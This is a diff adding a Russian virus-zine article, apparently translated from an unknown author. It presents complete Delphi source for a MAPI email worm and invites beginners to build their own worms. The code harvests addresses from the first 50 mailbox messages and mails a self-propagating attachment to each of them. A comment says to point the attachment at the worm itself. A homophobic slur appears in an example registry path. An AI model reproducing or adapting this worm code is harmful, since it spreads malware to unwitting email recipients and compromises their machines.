@@ -1,0 +1,203 @@
+          
+ █│█│█▀█│█▄▄ ▀┘▀█▀┘█▀█│▀█▀┘  █│█│  Когда я на почте служил ямщиком...
+ █▀█│█▀█│█▄█│█│ █│ █▀█│ █│   ▀▀█│  
+─────────────────────────────────
+  В самую последнюю минуту был найден данный файл, чье авторство установить не
+удалось (скромный автор :). Я его тут по-быстрому перевел (ну или типа того).
+Ну и ладно, надеюсь этот текст поможет вам в создании собственных червячков.
+
+========================[Кут хере]===========================================
+program mapiworm;
+
+uses
+  Windows, MAPI;
+
+{$R *.RES}
+
+(**************   MAPI-Черви на C++ и Delphi   *********************
+
+  Я не видел достаточно документации по написанию червей на ЯВУ под Win32.
+  И так, поехали. Ничего революционного, просто обычные вызовы API.
+  Эта статья нацелена на начинающих, так как действительно разработка этой
+  хрени в ручную доставляет большой гемморой и жрет кучу времени.
+
+  Я показываю этот код на Delphi потому что так он немного легче для чтения
+  и выглядит лучше чем в C++. Код может быть легко конвертированн C за 30 мин,
+  посмотрите в раздел Microsoft'овского MSDN по поводу примеров синтаксиса 
+  MAPI на C++. Тонны кода будут перолапачены перед тем, как вы вставите их
+  в вашего червя. Я оформил этот код в "большой форме", что является хорошим
+  тоном для печатных версий програм.
+
+  Код был протеститрован под NT 4.0, но может нуждаться в установленных 
+  исправслений для вашей системы и зависит от установленной конфигурации MAPI.
+  И перед тем, как смеяться над 20k кода, я проверил сайт AVP's на предмет MAPI
+  и нашел несколько червей очень большого размера пойманных в "диком виде":
+
+  I-Worm.PrettyPark: http://www.avp.ch/avpve/NewExe/win32/ppark.stm
+  I-Worm.ZippedFiles: http://www.avp.ch/avpve/worms/zipped.stm
+  I-Worm.WinExt: http://www.avp.ch/avpve/worms/WINEXT.stm
+  I-Worm.Plage: http://www.avp.ch/avpve/worms/Plage.stm
+
+  Несколько полезных ссылок:
+
+    Info on MAPI hook provider
+    http://support.microsoft.com/support/kb/articles/Q224/3/62.ASP
+
+    MAPI Address example
+    http://support.microsoft.com/support/kb/articles/Q126/6/58.asp
+
+    ReadMail example
+    http://support.microsoft.com/support/kb/articles/Q140/3/37.asp
+
+*)
+
+// Использование: HKEY_CURRENT_USER, 'Software\ImaFaggot', 'GayLesbian'
+function regReadString(kRoot: HKEY; sKey, sValue: String): String;
+var
+  qValue: array[0..1023] of Char;
+  DataSize: Integer;
+  CurrentKey: HKEY;
+begin
+  RegOpenKeyEx(kRoot, PChar(sKey), 0, KEY_ALL_ACCESS, CurrentKey);
+  Datasize := 1023;
+//  RegQueryValueEx(CurrentKey, PChar(sValue), nil, nil, nil, @DataSize);
+  RegQueryValueEx(CurrentKey, PChar(sValue), nil, nil, @qValue[0], @DataSize);
+  RegCloseKey(CurrentKey);
+  Result := String(qValue);
+end;
+
+var
+	MAPIMessage: TMAPIMessage;
+  lppMapiMessage: PMapiMessage;
+  Recip, inRecip: TMapiRecipDesc;
+  msgFile: TMapiFileDesc;
+  MError: Cardinal;
+  MapiSession, iMinusOne, i: LongInt;
+  bWinNT, bFindFirst: Boolean;
+  ProfileName, sAddress, sProfile, sSentMail: String;
+  sSeedMessageID, sMessageID: array[0..512] of Char;
+ 	os: TOSVersionInfo;
+begin
+	// В какой операционке мы оказались?
+	os.dwOSVersionInfoSize := SizeOf(TOSVersionInfo);
+	GetVersionEx(os);
+	bWinNT := (os.dwPlatformId = VER_PLATFORM_WIN32_NT);
+  // Получим профиль по умолчанию из реестра 
+	if (bWinNT) then
+    ProfileName := regReadString(HKEY_CURRENT_USER,
+      'Software\Microsoft\Windows NT\CurrentVersion\Windows Messaging Subsystem\Profiles',
+      'DefaultProfile')
+	else
+    // Стандартная Windows
+    ProfileName := regReadString(HKEY_CURRENT_USER,
+      'Software\Microsoft\Windows Messaging Subsystem\Profiles', 'DefaultProfile');
+
+  // Гребанный баг Delphi не дает установить значение -1 
+  // в структуре, и так мы обойдем это
+  iMinusOne := -1;
+  // Будем хранить любого предыдущего получателя
+  sSentMail := '';
+
+  // Залогинимся в MAPI.  Если не сработает - уйдем отсюда
+  try
+    MError := MapiLogOn(0, PChar(ProfileName), nil, MAPI_NEW_SESSION, 0, @MapiSession);
+    if (MError <> SUCCESS_SUCCESS) then
+      Exit;
+  except
+    ;
+  end;
+
+  // Заполним структуру файла своим аттачем
+  with msgFile do
+  begin
+    ulReserved := 0;
+    flFlags := 0;
+    nPosition := iMinusOne; // Пусть Outlook запомнит эту позицию
+    // Перезапишем INI путем/именем_файла нашего червя
+    lpszPathName := PChar('c:\windows\system.ini');
+    lpszFileName := nil;
+    lpFileType := nil;
+  end;
+
+  bFindFirst := True;
+
+  // Пройдемся по первым 50ти сообщениям
+  for i := 1 to 50 do
+  try
+    // Запомним с нашим MessageID
+    if (bFindFirst) then
+    begin
+      sSeedMessageID := '';
+      bFindFirst := False;
+    end
+    else
+      sSeedMessageID := sMessageID;
+
+    // Найдем сообщение
+    // Сервис MapiFindNext как и большинство "findfirst/findnext" функций,
+    // зависит от того, имеет ли MessageSeed значение
+    MError := MapiFindNext(MapiSession, 0, nil, @sSeedMessageID, 0, 0, @sMessageID);
+    if (MError = SUCCESS_SUCCESS) then
+    begin
+      // Получим long pointer
+      lppMapiMessage := @MAPIMessage;
+      // Открыть для чтения, только заголовки (намного быстрей, и позволит
+      // избежать записи аттачей во временную директорию)
+      MError := MAPIReadMail(MAPISession, 0, @sMessageID,
+        MAPI_ENVELOPE_ONLY, 0, lppMapiMessage);
+      if (MError = SUCCESS_SUCCESS) and (lppMapiMessage.lpRecips <> nil) then
+      begin
+
+        // Установим инфу о получателе 
+      	with Recip do
+        begin
+        	ulReserved := 0;
+          ulRecipClass := MAPI_TO;
+          sAddress := 'SMTP:' + lppMapiMessage.lpRecips.lpszAddress;
+          lpszAddress := Pchar(sAddress);
+          lpszName := lppMapiMessage.lpRecips.lpszName;
+      		ulEIDSize := 0;
+      		lpEntryID := nil;
+        end;
+
+        // Очистим для избежания всяких левых установок
+        FillChar(MAPIMessage, SizeOf(MAPIMessage), 0);
+        // Заполним структуру MapiMessage.
+        // Необязательно заполнять всю структуру, но эстетически приятней
+        with MapiMessage do
+        begin
+          ulReserved := 0;
+          lpszSubject := PChar('Вставьте subject для письма сюда');
+          lpszNoteText := PChar('Текст письма вставьте сюда');
+          lpszMessageType := nil;
+          lpszDateReceived := nil;
+          lpszConversationID := nil;
+          flFlags := 0;
+          lpOriginator := nil;
+          nRecipCount := 1;
+          lpRecips := @Recip;
+          nFileCount := 1;
+          lpFiles := @msgFile;
+        end;
+
+        // Отправим почту
+        if (Pos(lppMapiMessage.lpRecips.lpszAddress, sSentMail) = 0) then
+        begin
+          MError := MapiSendMail(MapiSession, {handle}0, MapiMessage, 0, 0);
+          // Сохраним этот адрес, чтоб не слать по два сообщения
+          sSentMail := sSentMail + lppMapiMessage.lpRecips.lpszAddress;
+        end;
+
+      end;
+    end;
+  except
+  end;
+
+  try
+    MError := MapiLogOff(MapiSession, 0, 0, 0);
+  except
+    ;
+  end;
+
+end.
+========================[Кут хере]===========================================
